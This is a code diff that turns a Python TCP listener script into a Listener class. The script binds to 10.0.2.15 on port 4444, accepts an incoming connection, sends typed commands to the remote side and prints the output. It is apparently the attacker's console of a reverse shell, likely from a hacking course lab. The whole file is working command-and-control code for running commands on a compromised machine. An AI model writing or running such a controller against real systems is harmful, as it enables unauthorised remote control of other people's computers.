@@ -1,30 +1,38 @@
 #!usr/bin/env python3
 import socket
 import sys
-import traceback
 
-server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+class Listener:
+    def __init__(self, ip:str, port:int) -> None:    
+        self.ip = ip 
+        self.port = port
+        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-server.bind(('10.0.2.15',4444))
-server.listen(0)
-print('[*] Server started and waiting for incoming connections.')
+        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.server.bind((self.ip,self.port))
+        self.server.listen(0)
+        print('[*] Server started and waiting for incoming connections.')
 
-connection, conn_addr = server.accept()
-print(f'[*] Incoming connection from {conn_addr}')
+        self.connection, conn_addr = self.server.accept()
+        print(f'[*] Incoming connection from {conn_addr}')
 
 
-while True:
-    try:
-        command = input('>> ').encode('utf-8')
-        connection.send(command)
-        result = connection.recv(1024).decode('utf-8')
-        print(result)
+    def execute_remotely(self, command):
+        self.connection.send(command)
+        return self.connection.recv(1024).decode('utf-8')
 
-    except KeyboardInterrupt:
-        print('[!] ctrl+c detected. Closing and exiting server/listener')
-        server.close()
-        sys.exit()
 
-    except Exception as e:
-        print('[-] Exception : ', e)
+    def run(self):
+        while True:
+            try:
+                command = input('>> ').encode('utf-8')
+                execution_result = self.execute_remotely(command)
+                print(execution_result)
+
+            except KeyboardInterrupt:
+                print('[!] ctrl+c detected. Closing and exiting server/listener')
+                self.server.close()
+                sys.exit()
+
+            except Exception as e:
+                print('[-] Exception : ', e)
